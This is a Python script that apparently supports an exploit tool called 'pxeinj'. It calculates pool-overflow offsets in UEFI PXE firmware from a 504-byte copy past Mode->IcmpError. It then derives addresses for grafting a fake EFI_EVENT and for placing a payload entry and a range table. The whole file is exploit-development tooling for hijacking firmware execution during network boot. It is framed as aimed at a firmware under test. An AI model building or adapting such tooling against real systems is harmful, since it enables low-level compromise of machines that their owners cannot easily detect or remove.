#!/usr/bin/env python3
"""fw_offsets.py - recover the numbers pxeinj needs from a firmware build.

Run against the firmware being tested. It does arithmetic from artefacts you
already have; it does not guess, and it will not produce a correct pool base on
its own.

The three inputs:

  SIZE OF MODE       sizeof(EFI_PXE_BASE_CODE_MODE), from the debug build's
                     symbols. The default below is only a starting point: take
                     the real value for the tree being tested.
  ICMP ERROR OFFSET  offsetof(EFI_PXE_BASE_CODE_MODE, IcmpError), from the same
                     build. Also version dependent.
  POOL BASE          the runtime address of Mode->IcmpError. Not derivable from
                     a map. Recover it from a debug serial log with DEBUG_POOL
                     enabled, then cache it.

Usage
  fw_offsets.py --map UefiPxeBcDxe.map --mode-len 0x... --icmp-off 0x... \
                [--pool-base 0x...]

The output shows the arithmetic so you can check it against the build rather
than trust it.
"""

import argparse
import re
import sys

POOL_GRAN = 0x10          # EFI pool allocation alignment
POOL_HDR = 0x10           # MEMORY_HEADER


def sizeof_from_map(path, sym):
    """Look for 'sym' followed by a size in a GNU ld map."""
    best = None
    with open(path, errors="replace") as f:
        for line in f:
            if sym in line:
                m = re.search(r"0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)", line)
                if m:
                    sz = int(m.group(2), 16)
                    if best is None or sz > best:
                        best = sz
    return best


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--map",
                    help="link map of the debug UefiPxeBcDxe.efi")
    ap.add_argument("--mode-len", type=lambda s: int(s, 0), required=False,
                    default=0x1f80,
                    help="sizeof(EFI_PXE_BASE_CODE_MODE); default is a guess")
    ap.add_argument("--icmp-off", type=lambda s: int(s, 0), default=0x1a40,
                    help="offsetof(EFI_PXE_BASE_CODE_MODE, IcmpError)")
    ap.add_argument("--pool-base", type=lambda s: int(s, 0), default=None)
    args = ap.parse_args()

    if args.map:
        n = sizeof_from_map(args.map, "IcmpError")
        if n:
            print(f"[i] map says IcmpError size {n:#x}")
        else:
            print("[i] no IcmpError size in map, using --mode-len")

    mode_alloc = POOL_HDR + ((args.mode_len + POOL_GRAN - 1) & ~(POOL_GRAN - 1))
    icmp_in_alloc = POOL_HDR + args.icmp_off

    print(f"[i] Mode allocation rounds to {mode_alloc:#x} bytes")
    print(f"[i] IcmpError sits {icmp_in_alloc:#x} into that allocation")
    print(f"[i] 504-byte copy ends at allocation + {icmp_in_alloc + 504:#x}")

    print()
    print("graft offsets, relative to &Mode->IcmpError:")
    first = mode_alloc - icmp_in_alloc
    for name, delta in (
        ("first corruptible byte (end of the 504-byte copy)", 504),
        ("next pool allocation, if it follows immediately", max(first, 504)),
        ("suggested event slot", max(first, 504) + 0x40),
    ):
        print(f"  {name:52s} +{delta:#06x}")

    if args.pool_base is not None:
        base = args.pool_base
        print()
        print(f"derived addresses for pool base {base:#x}:")
        print(f"  IEVENT graft      {base + 504:#x}")
        print(f"  parameter block   {base + 504 + 0x48:#x}")
        print(f"  payload entry     {base + 504 + 0x100:#x}")
        print(f"  range table       {base + 504 + 0x200:#x}")
        print()
        print("Before sending, dump 0x48 bytes at the IEVENT graft address.")
        print("  - a real EFI_EVENT there  -> fine, that is what gets replaced")
        print("  - unrelated data          -> the event slot is wrong, re-measure")
        print("  - unmapped / crash        -> the pool base is wrong")
    else:
        print()
        print("[!] no --pool-base: the offsets are right, the addresses are not.")
        print("    Recover it from a DEBUG_POOL serial log, then cache it.")


if __name__ == "__main__":
    sys.exit(main())
